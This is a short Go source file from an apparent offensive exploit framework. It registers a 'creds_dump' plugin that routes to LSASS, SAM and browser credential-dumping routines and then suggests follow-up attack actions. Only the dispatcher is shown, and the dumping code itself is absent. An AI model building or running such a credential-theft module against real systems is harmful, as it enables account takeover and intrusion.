package creds

import (
	"context"
	"fmt"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/plugin"
	"github.com/KKingZero/erebus-exploit-framwork/pkg/suggestions"
	"google.golang.org/protobuf/proto"
)

func init() {
	plugin.Global.Register(&CredDumpModule{})
}

type CredDumpModule struct{}

func (m *CredDumpModule) Name() string        { return "creds_dump" }
func (m *CredDumpModule) Description() string { return "Credential dumping (LSASS, SAM, browser)" }

func (m *CredDumpModule) Execute(ctx context.Context, config []byte) ([]byte, error) {
	cfg := &pb.CredDumpConfig{}
	if err := proto.Unmarshal(config, cfg); err != nil {
		return nil, fmt.Errorf("unmarshal cred dump config: %w", err)
	}

	var result *pb.CredDumpResult
	var err error

	switch cfg.Method {
	case "lsass":
		result, err = dumpLSASS(ctx, cfg)
	case "sam":
		result, err = dumpSAM(ctx, cfg)
	case "browser":
		result, err = dumpBrowser(ctx, cfg)
	default:
		return nil, fmt.Errorf("unknown dump method: %s (available: lsass, sam, browser)", cfg.Method)
	}

	if err != nil {
		return nil, err
	}

	result.NextSuggestedActions = suggestions.ForCredDump(result)
	return proto.Marshal(result)
}
